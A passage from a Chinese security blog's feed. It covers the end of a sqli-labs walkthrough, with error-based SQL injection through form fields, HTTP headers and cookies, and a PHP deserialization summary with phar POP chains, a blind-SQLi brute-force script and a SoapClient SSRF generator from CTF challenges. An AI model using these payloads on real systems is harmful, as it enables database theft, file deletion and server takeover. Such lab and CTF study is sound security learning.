class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">$row1 = $row[<span class="string">'username'</span>];  </span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row1;</span></span><br><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">mysql_query($update);</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname=sketch_pl4ne</span><br><span class="line">&amp;passwd=passwd'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="comment">#</span></span><br><span class="line">&amp;submit=Submit</span><br><span class="line">//其他报错注入语句自行尝试</span><br></pre></td></tr></table></figure><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>考察点：HTTP头部注入–UA</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your User Agent is: '</span> .$uagent;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//抓包修改UA</span><br><span class="line">' and updatexml(1,concat('~',(database()),'~'),3) and '1'='1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>考察点：HTTP头部注入–Referer</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="comment">//其余同Less-18</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//抓包改Referer</span><br><span class="line">' and updatexml(1,concat('~',(database()),'~'),3) and '1'='1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>考察点：HTTP头部注入–Cookie</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">.......</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//抓包改Cookie['uname']</span><br><span class="line">admin1'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@basedir),<span class="number">0x7e</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>考察点：HTTP头部注入–Cookie、base64编码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">......</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//抓包改Cookie['uname']</span><br><span class="line">YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = <span class="string">'"'</span>. $cookee. <span class="string">'"'</span>;</span><br><span class="line">.....</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//抓包改Cookie['uname']</span><br><span class="line">c2tldGNoX3BsNG5lImFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>英语作文还没写，wsl。。。</p><p>PPT还没写，wsl。。。</p><p>我感觉💊</p><p>虽然明天满课(还有两篇英语作文awsl)，还是争取写出来八。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;博主本质：日更(×) 日咕(✓)&lt;/p&gt;
&lt;p&gt;目前记录到Less-22 :-)&lt;/p&gt;
&lt;p&gt;Creeper?&lt;/p&gt;
&lt;p&gt;Awww m
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化总结</title>
    <link href="https://www.sketchplane.top/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>https://www.sketchplane.top/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</id>
    <published>2019-10-05T01:21:37.000Z</published>
    <updated>2019-10-07T15:59:58.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在先知看到<strong>Threezh1</strong>师傅的<a href="https://xz.aliyun.com/t/6454?accounttraceid=03358f4d-fd62-479c-a546-585108ff2163#toc-2" target="_blank" rel="noopener">文章</a>，PHP反序列化的姿势基本都有提到，无论是之前在P牛小密圈有提到的private和protect成员变量不可见字符的问题，还是一直想写的原生类反序列化，还有比较感兴趣的session反序列化；总之是一篇不错的PHP反序列化总结，学习学习！</p><h2 id="private成员变量"><a href="#private成员变量" class="headerlink" title="private成员变量"></a>private成员变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private_unserialize.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $args = <span class="string">"echo 'do something cool';"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">unserialize($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private_exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $args = <span class="string">"echo 'do something cool';"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setArgs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;args = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">$o-&gt;setArgs();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：这里因为没有private成员变量的访问权限，不能用<code>-&gt;</code>设置变量值。</strong></p><p>生成的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">18</span>:<span class="string">"sketch_pl4neargs"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure><p>但是打一发发现并没有按预期输出探针页面：</p><p><img src="https://t1.picb.cc/uploads/2019/10/06/g9CaFN.png" alt="1.png"></p><p>原因是存在空白字符，我们需要在类名左右添加空白字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">18</span>:<span class="string">"%00sketch_pl4ne%00args"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/10/06/g9CjVe.png" alt="2.png"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>如果成员变量是private，类名左右需要手工添加%00，也即<code>%00className%00</code>。</strong></p><h2 id="protected成员变量"><a href="#protected成员变量" class="headerlink" title="protected成员变量"></a>protected成员变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//protected_unserialize.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $args;</span><br><span class="line">    ...</span><br><span class="line">    略</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//protected_exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 同 private 变量，略</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>显然，我们直接输入构造的<code>payload</code>是会返回一个反序列化错误的：</p><p><img src="https://t1.picb.cc/uploads/2019/10/06/g9R2q8.png" alt="3.png"></p><p>原因与private类似，只不过不是在类名左右加空白字符，<strong>而是在出现<code>*</code>的两边加空白字符</strong>，这里<strong>Threezh1</strong>师傅貌似也是写的类名，所以还是得自己尝试一下。</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"%00*%00args"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p><strong>如果成员变量是protected，需要在出现*的两侧手工添加%00，也即<code>%00\*%00</code>。</strong></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>关于之前写过一篇比较详细的<a href="https://www.sketchplane.top/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/">文章</a> ，所以不再展开写了。这里想说的是除了文件函数会触发phar反序列化之外，还有一些其他函数因为底层调用了关键函数也可以触发反序列化，所以需要我们和这些函数认识认识，不然可能找不到phar反序列化的利用点 （比如<code>mime_content_type</code> ；还有需要知道绕过开头不能用<code>phar://</code>的几个方法。</p><p>下面的一些文章总结得比较全面：</p><p><a href="https://xz.aliyun.com/t/6454?accounttraceid=03358f4d-fd62-479c-a546-585108ff2163#toc-8" target="_blank" rel="noopener">PHP反序列化进阶学习与总结</a></p><p><a href="https://xz.aliyun.com/t/6057#toc-2" target="_blank" rel="noopener">SUCTF 2019 出题笔记 &amp; phar 反序列化的一些拓展</a></p><p> <a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">zsx师傅的文章</a></p><h2 id="原生类利用之-ZipArchive-open"><a href="#原生类利用之-ZipArchive-open" class="headerlink" title="原生类利用之 ZipArchive::open()"></a>原生类利用之 ZipArchive::open()</h2><p>挺有意思的知识点，php内置类ZipArchive::open()中的<code>flag</code>参数如果设置为<code>ZipArchive::OVERWRITE</code>的话，可以把指定文件删除，当然前提是存在open函数，<strong>所以以后看到open()的话得多个心眼了</strong>。</p><p>下面同样以 ByteCTF的 EZPHP为例，首先是一个hash长度拓展，老套路了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c</span><br><span class="line">Input Data: adminadmin</span><br><span class="line">Input Key Length: 18</span><br><span class="line">Input Data to Add: test</span><br><span class="line">bcb7fda11f22c5992de2093ed0e5a654</span><br><span class="line">adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00test</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00test</span><br><span class="line">user=bcb7fda11f22c5992de2093ed0e5a654</span><br></pre></td></tr></table></figure><p>由于 <code>mime_content_type()</code>是会触发反序列化的，接下来就是寻找POP链了：</p><p><strong>将 File::checker 赋值为 Profile对象，由于不存在upload_file()函数触发__call()方法，利用ZipArchive::open删除文件。</strong></p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//类到底是什么根据情况自行修改</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/911d87b0863d6f7e544f9c938b298c66/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不变</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的属性要怎么写根据情况自行修改</span></span><br><span class="line">$object = <span class="keyword">new</span> File(<span class="string">'filename'</span>, <span class="string">'filepath'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//不变</span></span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p><strong>PS：</strong>由于<code>filepath</code>存在过滤，用<code>php://filter/resource=phar://...../phar.phar</code>绕过即可。</p><p>最后访问之前上传的一句话木马即可get shell。</p><h2 id="原生类利用之-SoapClient-SSRF"><a href="#原生类利用之-SoapClient-SSRF" class="headerlink" title="原生类利用之 SoapClient SSRF"></a>原生类利用之 SoapClient SSRF</h2><p>这也是最近比较常见的反序列化的点了，一般出现在要求admin登录、并且要求本地登录时，走一个<code>unserialize -&gt; CRLF -&gt; SSRF</code>的利用链。</p><p>这里以 De1CTF的 shellshellshell为例，明确下利用思路：</p><p>首先是发现注入点，写一个脚本跑出密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a24cf81d-16b9-45cc-9ab1-23b73378fba1.node2.buuoj.cn.wetolink.com:82/index.php?action=publish"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'4em1g9rscdc9mfvddp6nno8i17'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破长度</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># 字符集合</span></span><br><span class="line">character = <span class="string">"abcdef1234567890"</span></span><br><span class="line"><span class="comment"># 数据库名</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># 遍历每一个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        signature = <span class="string">"123`,(if((ascii(substr((select password from ctf_users limit 1),%d,1)))=%d,sleep(5),1)))#"</span> % (i, ord(c))</span><br><span class="line">        mood = <span class="number">0</span></span><br><span class="line">        data = &#123;<span class="string">'signature'</span>: signature, <span class="string">'mood'</span>: mood&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            s.post(url, data=data, cookies=cookies, timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>由于admin设置了非本地ip不允许登录，光有密码还不够，我们需要SSRF绕过限制；发现sql注入同时还存在一处反序列化漏洞：</p><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180313112022-7728da44-266d-1.png" alt=""></p><p>生成本地admin登录报文：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=用户密码&amp;code=你的验证码'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=需要成为admin的浏览器的cookie'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后注入，刷新浏览器即可成为admin，然后即可进入上传页面。</p><h2 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h2><h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>PHP中session默认是以文件形式存储的，文件以<code>sess_sessionid</code>命名，内容根据序列化的处理器的不同，有相应的存储格式，序列化处理器默认为<code>php</code>，可以通过<code>php_serialize_handler</code>设置。</p><h3 id="存储格式"><a href="#存储格式" class="headerlink" title="存储格式"></a>存储格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php：键名|serialize(键值)</span><br><span class="line">php_serialize：serialize(键名和键值)</span><br><span class="line">php_binary：键名长度对应的ascii字符+键名+serialize(键值)</span><br></pre></td></tr></table></figure><p>以一个小例子验证：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//session_generate.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);<span class="comment">//通过更换不同的处理器观察session变化</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'sketch_pl4ne'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php：</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5C67.png" alt=""></p><p>php_serialize：</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5cO6.png" alt=""></p><p><strong>PS：a:1:{xxxxxx}是默认格式</strong></p><p>php_binary：</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5mPT.png" 